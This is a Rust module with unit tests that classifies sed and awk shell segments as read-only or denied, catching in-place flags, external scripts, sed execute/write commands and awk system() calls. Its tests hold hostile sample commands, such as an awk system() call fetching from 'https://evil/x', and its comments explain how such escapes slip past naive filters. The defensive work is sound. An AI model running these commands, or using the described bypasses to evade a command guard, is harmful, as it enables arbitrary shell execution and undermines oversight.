//! Deny-by-default safety analysis for `sed`/`awk`-family Bash segments
//! (issue #2664, security redesign after code-critic BLOCK on PR #2677).
//!
//! Why: a name-only deny-list (`sed`/`awk` always deny) blocked ubiquitous
//! read-only stream-filter idioms like `git status --porcelain | awk '{print
//! $1}'`. But the first fix attempt inverted to allow-by-default-unless-an-
//! in-place-flag-is-present, which opened real shell-escape holes: awk's
//! `system()` builtin (arbitrary shell exec, no `-i`, no `>`), sed's `e`
//! (execute) and `w`/`W` (write-to-file) script commands, and `-f`/`--file`
//! loading a script the guard can never see. The correct shape is
//! deny-by-default with a narrow, explicitly-verified read-only carve-out —
//! a missed deny is the dangerous direction, so every ambiguous or
//! unparseable case denies.
//! What: [`sed_is_readonly`] / [`awk_is_readonly`] are called only after
//! [`super::classify_bash_segment`] has already matched the segment's first
//! token as `sed` / `awk`-family; each returns `true` only when the segment
//! proves out narrowly read-only under every check (no in-place flag, no
//! external script load, no write/exec script construct, balanced quotes).
//! Test: `sed_is_readonly_*`, `awk_is_readonly_*`, `has_unbalanced_quotes_*`
//! in this module's `tests` submodule.

/// Whether a `sed` segment is narrowly read-only: no in-place edit flag, no
/// external `-f`/`--file` script, no `e`/`w`/`W` write-or-execute script
/// command (standalone or as an `s///` flag), and balanced quotes.
///
/// Why: see the module docs. `sed -n '1,5p' f` / `sed 's/a/b/g' f | grep x`
/// are ubiquitous, non-mutating idioms; anything else about `sed` can write a
/// file or execute a shell command, so it denies by default.
/// What: short-circuits `false` (deny) on the first hit of
/// [`has_unbalanced_quotes`] (a segment splitter side-effect that hides a
/// pipe/semicolon inside what was originally a quoted script — see the
/// module docs on `awk` co-processes, which applies equally here),
/// [`sed_has_inplace_flag`], [`sed_has_external_script_flag`], or
/// [`sed_script_has_write_or_exec`]. Only when none match does it return
/// `true`.
/// Test: `sed_is_readonly_allows_stream_filters`,
/// `sed_is_readonly_denies_in_place`, `sed_is_readonly_denies_external_script`,
/// `sed_is_readonly_denies_write_or_exec_commands`,
/// `sed_is_readonly_denies_in_place_abbreviations`.
pub(super) fn sed_is_readonly(segment: &str) -> bool {
    if has_unbalanced_quotes(segment) {
        return false;
    }
    if sed_has_inplace_flag(segment) {
        return false;
    }
    if sed_has_external_script_flag(segment) {
        return false;
    }
    if sed_script_has_write_or_exec(segment) {
        return false;
    }
    true
}

/// Whether an `awk`-family segment is narrowly read-only: no in-place-edit
/// extension loader, no external `-f`/`--file` program, no `system()` call,
/// no co-process pipe (via the balanced-quote check), and balanced quotes.
///
/// Why: see the module docs — `system()` and `print | "cmd"` co-processes
/// are full shell escapes with no `-i` and no `>` involved, so they are not
/// caught by any redirection heuristic and must be denied by content, not by
/// flag alone.
/// What: mirrors [`sed_is_readonly`]'s short-circuit shape for the
/// awk-specific checks: [`has_unbalanced_quotes`], [`awk_has_inplace_flag`],
/// [`awk_has_external_script_flag`], and [`awk_program_has_system_call`].
/// Test: `awk_is_readonly_allows_stream_filters`,
/// `awk_is_readonly_denies_in_place`, `awk_is_readonly_denies_external_script`,
/// `awk_is_readonly_denies_system_call`, `awk_is_readonly_denies_coprocess`.
pub(super) fn awk_is_readonly(segment: &str) -> bool {
    if has_unbalanced_quotes(segment) {
        return false;
    }
    if awk_has_inplace_flag(segment) {
        return false;
    }
    if awk_has_external_script_flag(segment) {
        return false;
    }
    if awk_program_has_system_call(segment) {
        return false;
    }
    true
}

/// Whether `segment` ends with an unclosed `'` or `"` quote.
///
/// Why: [`super::split_shell_segments`] is deliberately quote-unaware — it
/// cuts on every bare `;`/`|`/`&`/newline regardless of quoting. A `sed`/`awk`
/// script that legitimately uses one of those characters *inside* a quoted
/// program (most notably a `|` for an awk co-process, or piping into/out of
/// `getline`/`print`) gets its enclosing quote cut in half by that split,
/// leaving an unclosed quote in the resulting segment. That is a reliable,
/// general signal that this segment's classification is unsafe to trust — the
/// real command may contain content this segment never shows us — so it must
/// deny, not just the specific co-process pattern it happened to originate
/// from.
/// What: a single left-to-right scan tracking whether we are currently inside
/// a single- or double-quoted run (mutually exclusive — a quote character of
/// the *other* kind is ignored while inside a run, so an apostrophe inside a
/// double-quoted script like `sed "s/can't/cannot/" f` or
/// `awk -F"'" '{...}'` does not spuriously toggle single-quote state).
/// Returns `true` (deny-worthy) when either kind is still open at the end of
/// `segment`. Deliberately quote-unaware about backslash-escaping, matching
/// this module family's conservative posture.
/// Test: `has_unbalanced_quotes_*`.
fn has_unbalanced_quotes(segment: &str) -> bool {
    let mut in_single = false;
    let mut in_double = false;
    for b in segment.bytes() {
        match b {
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            _ => {}
        }
    }
    in_single || in_double
}

/// Whether a `sed` segment carries an in-place-edit flag (GNU `-i[SUFFIX]` /
/// `--in-place[=SUFFIX]` or any unambiguous GNU-getopt abbreviation of the
/// latter, including a suffix attached with no space like `-i.bak`, and
/// combined short-option clusters like `-ni`).
///
/// Why: GNU sed accepts any unambiguous prefix of a long option, so
/// `--in`, `--in-p`, `--in-place=bak`, etc. must all be caught, not just the
/// exact spelling — no other GNU sed long option begins `in`, so a `--in`
/// prefix match is unambiguous. GNU sed has exactly one short option using
/// the letter `i` (`-i`), so a "does this dash-cluster contain `i`" scan is
/// safe for short options.
/// What: tokenizes on whitespace; a hit is a token starting with `--in`
/// (covers every abbreviation/suffix form), or a token starting with a single
/// `-` (not `--`) whose remainder contains the byte `i`.
/// Test: `sed_is_readonly_denies_in_place`,
/// `sed_is_readonly_denies_in_place_abbreviations`.
fn sed_has_inplace_flag(segment: &str) -> bool {
    for token in segment.split_whitespace() {
        if token.starts_with("--in") {
            return true;
        }
        if token.starts_with("--") {
            continue;
        }
        if let Some(rest) = token.strip_prefix('-')
            && !rest.is_empty()
            && rest.contains('i')
        {
            return true;
        }
    }
    false
}

/// Whether a `sed` segment loads an external script via `-f`/`--file`.
///
/// Why: an external script is content the guard cannot see — it may contain
/// any `e`/`w`/`W` command this module otherwise detects — so it must deny
/// unconditionally rather than trust an absent local check.
/// What: tokenizes on whitespace; a hit is `--file`, a token starting with
/// `--file=`, or a token starting with a single `-` (not `--`) whose
/// remainder contains the byte `f` (GNU sed's only short option using `f`).
/// Test: `sed_is_readonly_denies_external_script`.
fn sed_has_external_script_flag(segment: &str) -> bool {
    for token in segment.split_whitespace() {
        if token == "--file" || token.starts_with("--file=") {
            return true;
        }
        if token.starts_with("--") {
            continue;
        }
        if let Some(rest) = token.strip_prefix('-')
            && !rest.is_empty()
            && rest.contains('f')
        {
            return true;
        }
    }
    false
}

/// Skip the leading program-name / env-assignment / `sudo`|`env` / flag
/// tokens of a `sed` segment, returning the suffix where script (and
/// trailing filename) content begins.
///
/// Why: [`sed_script_has_write_or_exec`] must not misparse the literal word
/// `sed` itself (which starts with `s`) as an `s///` substitution command —
/// it needs to see only the script-and-arguments tail. Scanning by byte
/// offset (rather than `split_whitespace` + rejoin) preserves the original
/// spacing the address/command parser depends on.
/// What: walks whitespace-delimited words from the start, skipping
/// `KEY=value` env assignments, `sudo`/`env`, a word equal to `sed` or ending
/// `/sed`, and any word starting with `-` (a flag; note a flag's *argument*,
/// e.g. `-e`'s script, is a separate word that does NOT start with `-` and is
/// therefore not skipped). Returns the byte-offset suffix of `segment`
/// starting at the first non-skipped word, or `""` if every word was
/// skippable.
/// Test: covered via `sed_is_readonly_denies_write_or_exec_commands` and
/// `sed_is_readonly_allows_stream_filters`.
fn sed_script_region(segment: &str) -> &str {
    let bytes = segment.as_bytes();
    let mut idx = 0;
    loop {
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx >= bytes.len() {
            return "";
        }
        let word_start = idx;
        while idx < bytes.len() && !bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        let word = &segment[word_start..idx];
        let is_env = word.split_once('=').is_some_and(|(k, _)| {
            !k.is_empty()
                && k.chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
                && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        });
        if is_env || word == "sudo" || word == "env" || word == "sed" || word.ends_with("/sed") {
            continue;
        }
        if word.starts_with('-') {
            continue;
        }
        return &segment[word_start..];
    }
}

/// Whether a `sed` script contains a standalone `e`/`w`/`W` command or an
/// `s///` substitution with an `e` or `w` flag.
///
/// Why: these execute (`e`) or write-to-file (`w`/`W`) without any `-i` flag
/// and without any `>` redirection, so no other check in this module family
/// catches them.
/// What: resolves the script-and-arguments region via [`sed_script_region`],
/// splits it on `;`, `\n`, `{`, `}` (sed statement boundaries), and for each
/// resulting statement strips a leading quote character (real sed scripts
/// arrive shell-quoted, e.g. `'1e cmd'`) then skips a leading sed address
/// (digits/`~step`, `$`, or a `/regex/` — optionally a `,`-joined range —
/// optionally followed by `!` negation) via [`skip_sed_address`]. If what
/// remains starts with `e`/`w`/`W` as a standalone token (end of statement or
/// followed by whitespace), or starts with `s` followed by a delimiter and
/// the parsed flags run (after [`skip_sed_substitution`]) contains `e` or
/// `w`, the script is unsafe. An `s` command whose delimiters cannot be
/// resolved denies conservatively (ambiguous → unsafe).
/// Test: `sed_is_readonly_denies_write_or_exec_commands`.
fn sed_script_has_write_or_exec(segment: &str) -> bool {
    for raw_stmt in sed_script_region(segment).split(['\u{003B}', '\n', '{', '}']) {
        let trimmed = raw_stmt.trim_start().trim_start_matches(['\'', '"']);
        let mut rest = skip_sed_address(trimmed);
        rest = rest.trim_start_matches(['!', ' ', '\t']);
        let bytes = rest.as_bytes();
        if bytes.is_empty() {
            continue;
        }
        match bytes[0] {
            b'e' | b'w' | b'W' => {
                let standalone = bytes.len() == 1 || bytes[1] == b' ' || bytes[1] == b'\t';
                if standalone {
                    return true;
                }
            }
            b's' if bytes.len() > 1 => {
                match skip_sed_substitution(rest) {
                    Some(flags) if flags.contains('e') || flags.contains('w') => return true,
                    Some(_) => {}
                    // Delimiters didn't resolve within this statement slice —
                    // ambiguous (statement splitting is quote/regex-unaware),
                    // so deny conservatively rather than assume it's safe.
                    None => return true,
                }
            }
            _ => {}
        }
    }
    false
}

/// Skip a leading sed address (`N`, `N~M`, `$`, `/re/`, optionally a
/// `,`-joined range) from the front of `stmt`, returning what follows.
///
/// Why: factored out of [`sed_script_has_write_or_exec`] so the command-letter
/// check operates on the command, not an address that happens to contain a
/// digit or `/`.
/// What: consumes up to two addresses joined by `,`; each address is a
/// digit run (with an optional `~digit` step), `$`, or a `/`-delimited regex
/// (scanning to the next unescaped `/`). Unrecognised leading content (no
/// address present) returns `stmt` unchanged.
/// Test: covered via `sed_script_has_write_or_exec` call sites in
/// `sed_is_readonly_denies_write_or_exec_commands`.
fn skip_sed_address(stmt: &str) -> &str {
    let mut rest = stmt;
    for _ in 0..2 {
        let bytes = rest.as_bytes();
        if bytes.is_empty() {
            break;
        }
        let consumed = if bytes[0] == b'$' {
            1
        } else if bytes[0].is_ascii_digit() {
            let mut n = 0;
            while n < bytes.len() && bytes[n].is_ascii_digit() {
                n += 1;
            }
            if n < bytes.len() && bytes[n] == b'~' {
                n += 1;
                while n < bytes.len() && bytes[n].is_ascii_digit() {
                    n += 1;
                }
            }
            n
        } else if bytes[0] == b'/' {
            match rest[1..].find('/') {
                Some(end) => end + 2,
                None => return rest,
            }
        } else {
            0
        };
        if consumed == 0 {
            break;
        }
        rest = &rest[consumed..];
        rest = rest.trim_start();
        if let Some(after_comma) = rest.strip_prefix(',') {
            rest = after_comma.trim_start();
            continue;
        }
        break;
    }
    rest
}

/// Parse an `s<delim>pattern<delim>replacement<delim>flags` command starting
/// at `rest` (whose first byte is `s`), returning the trailing flags run.
///
/// Why: factored out of [`sed_script_has_write_or_exec`] — the `e`/`w` danger
/// for an `s` command lives in its flags, which sit after two more
/// occurrences of the delimiter chosen right after `s`.
/// What: takes `rest.as_bytes()[1]` as the delimiter, scans for the next two
/// unescaped occurrences of that byte, then reads the run of ASCII-alphameric
/// flag characters immediately after the second. Returns `None` if either
/// delimiter cannot be found (ambiguous — the caller denies conservatively).
/// Test: covered via `sed_is_readonly_denies_write_or_exec_commands`.
fn skip_sed_substitution(rest: &str) -> Option<&str> {
    let bytes = rest.as_bytes();
    let delim = bytes[1];
    if delim == b' ' || delim == b'\t' {
        return None;
    }
    let mut idx = 2;
    let mut delim_count = 0;
    while idx < bytes.len() && delim_count < 2 {
        if bytes[idx] == delim && (idx == 0 || bytes[idx - 1] != b'\\') {
            delim_count += 1;
        }
        idx += 1;
    }
    if delim_count < 2 {
        return None;
    }
    let flags_start = idx;
    let mut flags_end = flags_start;
    while flags_end < bytes.len() && bytes[flags_end].is_ascii_alphanumeric() {
        flags_end += 1;
    }
    Some(&rest[flags_start..flags_end])
}

/// Whether an `awk`-family segment carries the in-place-edit extension
/// loader (`-i inplace` / `--include inplace` / `--include=inplace`, or the
/// attached `-iinplace` form).
///
/// Why: gawk's in-place editing is an opt-in extension loaded exactly this
/// way; per issue #2664's fallback guidance, any bare `-i`/`--include` is
/// conservatively treated as this loader since that is the only mechanism
/// awk exposes for it.
/// What: tokenizes on whitespace; a hit is a token equal to `-i` or
/// `--include`, a token starting with `--include=`, or a token starting with
/// `-i` followed by more characters (the attached `-iinplace` form).
/// Test: `awk_is_readonly_denies_in_place`.
fn awk_has_inplace_flag(segment: &str) -> bool {
    for token in segment.split_whitespace() {
        if token == "-i" || token == "--include" || token.starts_with("--include=") {
            return true;
        }
        if token.len() > 2 && token.starts_with("-i") && !token.starts_with("--") {
            return true;
        }
    }
    false
}

/// Whether an `awk`-family segment loads an external program via
/// `-f`/`--file`.
///
/// Why: same rationale as [`sed_has_external_script_flag`] — content the
/// guard cannot see may contain `system()`/co-process calls.
/// What: a hit is a token equal to `-f`, starting with `-f` (attached
/// filename form), `--file`, or starting with `--file=`.
/// Test: `awk_is_readonly_denies_external_script`.
fn awk_has_external_script_flag(segment: &str) -> bool {
    for token in segment.split_whitespace() {
        if token == "--file" || token.starts_with("--file=") {
            return true;
        }
        if token == "-f" || (token.len() > 2 && token.starts_with("-f")) {
            return true;
        }
    }
    false
}

/// Whether an `awk`-family segment's program text calls the `system(`
/// builtin.
///
/// Why: `system()` executes an arbitrary shell command — the single most
/// direct escape this module family defends against. A plain
/// `contains("system(")` substring check is bypassable: AWK's grammar
/// permits (and real-world sloppy style commonly has) whitespace between a
/// builtin name and its opening parenthesis, so `system ("touch /tmp/x")` —
/// with a space — calls `system` exactly the same as `system(...)` but was
/// missed by the no-space-only check (code-critic re-review of PR #2677,
/// empirically confirmed live: `awk 'BEGIN{system ("echo x")}'` executes).
/// What: a manual byte scan for the identifier `system` as a standalone
/// token — the preceding byte (if any) must not be alphanumeric/underscore,
/// so `mysystem(` and `system_call(` do not false-positive as this specific
/// check — followed by zero or more ASCII whitespace bytes (space, tab,
/// `\n`, `\r`) and then `(`. Deliberately quote-unaware, matching this module
/// family's conservative posture: a call hidden inside what looks like a
/// string literal still denies.
/// Test: `awk_is_readonly_denies_system_call`,
/// `awk_program_has_system_call_tolerates_whitespace_before_paren`,
/// `awk_program_has_system_call_does_not_match_identifier_suffix`.
fn awk_program_has_system_call(segment: &str) -> bool {
    const NEEDLE: &[u8] = b"system";
    let bytes = segment.as_bytes();
    let is_ident_byte = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut i = 0;
    while i + NEEDLE.len() <= bytes.len() {
        let is_match = &bytes[i..i + NEEDLE.len()] == NEEDLE;
        let prev_is_boundary = i == 0 || !is_ident_byte(bytes[i - 1]);
        if is_match && prev_is_boundary {
            let mut j = i + NEEDLE.len();
            while j < bytes.len() && matches!(bytes[j], b' ' | b'\t' | b'\n' | b'\r') {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'(' {
                return true;
            }
        }
        i += 1;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sed_is_readonly_allows_stream_filters() {
        // Direct unit calls pass a single-command segment, matching what
        // `classify_bash_segment` actually hands to `sed_is_readonly` after
        // splitting; full multi-command pipelines are covered separately in
        // `mod.rs`'s `evaluate_bash_command_allows_readonly_sed_awk`.
        for cmd in [
            "sed -n '1,5p' file.txt",
            "sed 's/a/b/g' f",
            "sed -e 's/a/b/' f",
            "sed --posix 's/a/b/' f",
            "sed 's/a/b/'",
        ] {
            assert!(sed_is_readonly(cmd), "expected read-only: {cmd}");
        }
    }

    #[test]
    fn sed_is_readonly_denies_in_place() {
        for cmd in [
            "sed -i s/a/b/ f",
            "sed -i.bak s/a/b/ f",
            "sed -ni s/a/b/p f",
            "sed --in-place s/a/b/ f",
            "sed --in-place=.bak s/a/b/ f",
        ] {
            assert!(!sed_is_readonly(cmd), "expected deny (in-place): {cmd}");
        }
    }

    #[test]
    fn sed_is_readonly_denies_in_place_abbreviations() {
        for cmd in [
            "sed --in s/a/b/ f",
            "sed --in-p s/a/b/ f",
            "sed --in=bak s/a/b/ f",
        ] {
            assert!(
                !sed_is_readonly(cmd),
                "expected deny (abbreviated --in-place): {cmd}"
            );
        }
    }

    #[test]
    fn sed_is_readonly_denies_external_script() {
        for cmd in [
            "sed -f script.sed f",
            "sed --file script.sed f",
            "sed --file=s.sed f",
        ] {
            assert!(!sed_is_readonly(cmd), "expected deny (-f): {cmd}");
        }
    }

    #[test]
    fn sed_is_readonly_denies_write_or_exec_commands() {
        for cmd in [
            "sed '1e touch /tmp/x' f",
            "sed -n '1,5w /tmp/out' f",
            "sed '$w /tmp/out' f",
            "sed 's/a/b/e' f",
            "sed 's/a/b/w /tmp/out' f",
            "sed 's/a/b/gw /tmp/out' f",
        ] {
            assert!(!sed_is_readonly(cmd), "expected deny (e/w/W): {cmd}");
        }
    }

    #[test]
    fn awk_is_readonly_allows_stream_filters() {
        for cmd in [
            "awk '{print $1}'",
            "awk -F, '{print $1}' f",
            "git log | awk '{print $1}'",
        ] {
            assert!(awk_is_readonly(cmd), "expected read-only: {cmd}");
        }
    }

    #[test]
    fn awk_is_readonly_denies_in_place() {
        for cmd in [
            "awk -i inplace '{print}' f",
            "awk --include inplace '{print}' f",
            "awk --include=inplace '{print}' f",
            "awk -iinplace '{print}' f",
        ] {
            assert!(!awk_is_readonly(cmd), "expected deny (in-place): {cmd}");
        }
    }

    #[test]
    fn awk_is_readonly_denies_external_script() {
        for cmd in ["awk -f script.awk f", "awk --file script.awk f"] {
            assert!(!awk_is_readonly(cmd), "expected deny (-f): {cmd}");
        }
    }

    #[test]
    fn awk_is_readonly_denies_system_call() {
        for cmd in [
            r#"awk 'BEGIN{system("touch /tmp/x")}'"#,
            r#"awk 'BEGIN{system("curl https://evil/x")}'"#,
        ] {
            assert!(!awk_is_readonly(cmd), "expected deny (system()): {cmd}");
        }
    }

    #[test]
    fn awk_is_readonly_denies_system_call_with_whitespace_before_paren() {
        // Code-critic re-review of PR #2677: AWK permits whitespace between a
        // builtin name and its `(`, and `system ("...")` executes the same
        // as `system("...")` — a no-space-only check misses it entirely.
        for cmd in [
            "awk 'BEGIN{system (\"touch /tmp/x\")}'",
            "awk 'BEGIN{system\t(\"echo x\")}'",
            "awk 'BEGIN{system (\"curl https://evil/x\")}'",
        ] {
            assert!(
                !awk_is_readonly(cmd),
                "expected deny (system with whitespace before paren): {cmd}"
            );
        }
    }

    #[test]
    fn awk_program_has_system_call_tolerates_whitespace_before_paren() {
        for prog in [
            r#"system("x")"#,
            r#"system ("x")"#,
            "system\t(\"x\")",
            "system \t (\"x\")",
        ] {
            assert!(
                awk_program_has_system_call(prog),
                "expected system() call detected: {prog}"
            );
        }
    }

    #[test]
    fn awk_program_has_system_call_does_not_match_identifier_suffix() {
        // `system` must be a standalone identifier, not a suffix/prefix of a
        // longer one — `mysystem(` and `system_call(` are not calls to the
        // `system` builtin.
        for prog in [r#"mysystem("x")"#, r#"system_call("x")"#, "system_("] {
            assert!(
                !awk_program_has_system_call(prog),
                "expected no system() detection for: {prog}"
            );
        }
    }

    #[test]
    fn awk_is_readonly_denies_coprocess() {
        // A co-process `|` inside a quoted awk program is itself a bare `|`
        // to the (quote-unaware) upstream segment splitter, so it gets cut
        // in half. Exercise `awk_is_readonly` on the resulting fragment —
        // the shape `evaluate_bash_command` actually hands it — rather than
        // the pre-split whole command, which has balanced quotes and would
        // pass this check by construction.
        for cmd in [
            r#"awk 'BEGIN{print | "sort"}'"#,
            r#"awk 'BEGIN{"date" | getline}'"#,
        ] {
            for fragment in super::super::split_shell_segments(cmd) {
                let trimmed = fragment.trim();
                if trimmed.starts_with("awk") {
                    assert!(
                        !awk_is_readonly(trimmed),
                        "expected deny for split co-process fragment: {trimmed:?} (from {cmd})"
                    );
                }
            }
        }
    }

    #[test]
    fn has_unbalanced_quotes_detects_odd_counts() {
        assert!(has_unbalanced_quotes("awk 'BEGIN{print "));
        assert!(has_unbalanced_quotes(" \"sort\"}'"));
        assert!(!has_unbalanced_quotes("awk '{print $1}'"));
        assert!(!has_unbalanced_quotes("sed 's/a/b/g' f"));
    }

    #[test]
    fn has_unbalanced_quotes_ignores_apostrophe_inside_double_quotes() {
        // A literal apostrophe inside a double-quoted script (a contraction,
        // or a single-quote-as-data field separator) must not spuriously
        // toggle single-quote state and report "unbalanced".
        assert!(!has_unbalanced_quotes(r#"sed "s/can't/cannot/" f"#));
        assert!(!has_unbalanced_quotes(r#"awk -F"'" '{print $2}'"#));
    }

    #[test]
    fn sed_is_readonly_allows_apostrophe_inside_double_quoted_script() {
        // Code-critic re-review MEDIUM: contractions in a double-quoted sed
        // script are common and read-only; must not be over-denied.
        assert!(sed_is_readonly(r#"sed "s/can't/cannot/" f"#));
    }

    #[test]
    fn awk_is_readonly_allows_apostrophe_inside_double_quoted_field_separator() {
        assert!(awk_is_readonly(r#"awk -F"'" '{print $2}'"#));
    }

    #[test]
    fn has_unbalanced_quotes_still_denies_coprocess_fragment() {
        // The quote-context-aware rewrite must not weaken the co-process
        // detection it exists to support: a genuinely unclosed quote (the
        // upstream split-at-`|` fragment shape) still reports unbalanced.
        assert!(has_unbalanced_quotes("awk 'BEGIN{print"));
        assert!(has_unbalanced_quotes(" \"sort"));
    }
}
